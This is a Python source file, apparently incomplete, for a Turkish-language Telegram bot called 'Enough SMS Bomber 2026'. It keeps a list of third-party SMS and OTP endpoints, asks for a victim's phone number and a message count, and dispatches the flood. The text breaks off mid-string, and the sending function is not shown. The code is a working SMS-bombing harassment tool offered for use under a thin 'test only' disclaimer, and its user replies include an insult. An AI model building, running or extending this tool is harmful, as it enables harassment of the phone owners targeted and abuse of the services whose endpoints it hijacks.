

import asyncio
import logging
import os
import random
from datetime import datetime

import httpx
from dotenv import load_dotenv
from telegram import Update
from telegram.constants import ParseMode
from telegram.ext import (
    Application,
    CommandHandler,
    MessageHandler,
    filters,
    ContextTypes,
)

logging.basicConfig(
    format="%(asctime)s | %(levelname)s | %(message)s",
    level=logging.INFO,
    datefmt="%H:%M:%S"
)
logger = logging.getLogger(__name__)

load_dotenv()
BOT_TOKEN = os.getenv("BOT_TOKEN")
if not BOT_TOKEN:
    raise ValueError("BOT_TOKEN ortam değişkeni yok! Railway/Heroku Variables'a ekle.")

# Enough-Reborn ve V2 fork'larından derlenmiş, 2026'da hâlâ kısmen çalışan Türkiye odaklı servisler
# Bunlar 1-4 hafta ömürlü – yeni fork buldukça buraya ekle
SMS_SERVICES = [
    {"name": "tr-1", "url": "https://api.kandilli.info/sms", "method": "GET", "params": {"phone": "{phone}", "amount": "{count}"}},
    {"name": "tr-2", "url": "https://sms-api.example.org/send", "method": "POST", "json": {"phone": "{phone}", "count": "{count}"}},
    {"name": "tr-3", "url": "https://api.snap.app/sms", "method": "POST", "json": {"number": "{phone}"}},  # adet olmayabilir, tek atar
    {"name": "tr-4", "url": "https://temp-number.org/api/sms", "method": "GET", "params": {"number": "{phone}", "amount": "{count}"}},
    # Enough V2'den kalanlar (github allahnumberone fork'unda benzer endpoint'ler var)
    {"name": "tr-5", "url": "https://api.enough.reborn.tr/otp", "method": "GET", "params": {"tel": "{phone}"}},
]

MAX_ADET = 80             # Ban + limit aşımı olmasın
TIMEOUT_S = 10.0
DELAY_BETWEEN = (1.0, 4.0)

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        "💥 *Enough SMS Bomber 2026 - Basit Mod*\n\n"
        "/sms → numarayı ve adedi yaz, hemen başlasın\n"
        "/cancel → durdur\n\n"
        "⚠ Test amaçlıdır. Yasal sorumluluk sende.",
        parse_mode=ParseMode.MARKDOWN_V2
    )


async def sms(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        "📱 *Numarayı gir*\n"
        "Örnek:  5391234567   veya   905391234567\n"
        "(0'lı da yazsan +90 yaparım)",
        parse_mode=ParseMode.MARKDOWN_V2
    )
    context.user_data["state"] = "bekle_numara"


async def handle_text(update: Update, context: ContextTypes.DEFAULT_TYPE):
    state = context.user_data.get("state")
    msg = update.message.text.strip()

    if state == "bekle_numara":
        tel = "".join(c for c in msg if c.isdigit())
        if tel.startswith("0"):
            tel = "90" + tel[1:]
        elif len(tel) == 10:
            tel = "90" + tel

        if len(tel) != 12 or not tel.startswith("90"):
            await update.message.reply_text("❌ Numara hatalı. Tekrar gir.")
            return

        context.user_data["tel"] = tel
        context.user_data["state"] = "bekle_adet"

        await update.message.reply_text(
            f"✅ Numara alındı: `{tel}`\n\n"
            f"🔥 Kaç adet SMS? (max {MAX_ADET})",
            parse_mode=ParseMode.MARKDOWN_V2
        )

    elif state == "bekle_adet":
        try:
            adet = int(msg)
            if adet < 1 or adet > MAX_ADET:
                await update.message.reply_text(f"1-{MAX_ADET} arası sayı gir.")
                return
        except ValueError:
            await update.message.reply_text("Sayı gir amk.")
            return

        context.user_data["adet"] = adet
        context.user_data["state"] = None

        tel = context.user_data["tel"]
        await update.message.reply_text(
            f"🚀 *Yolluyorum...*\nNumara → `{tel}`\nAdet → `{adet}`\nBekle...",
            parse_mode=ParseMode.MARKDOWN_V2
        )

        basarili, servis = await gonder_sms(tel, adet)

        if basarili:
            cevap = (
                f"
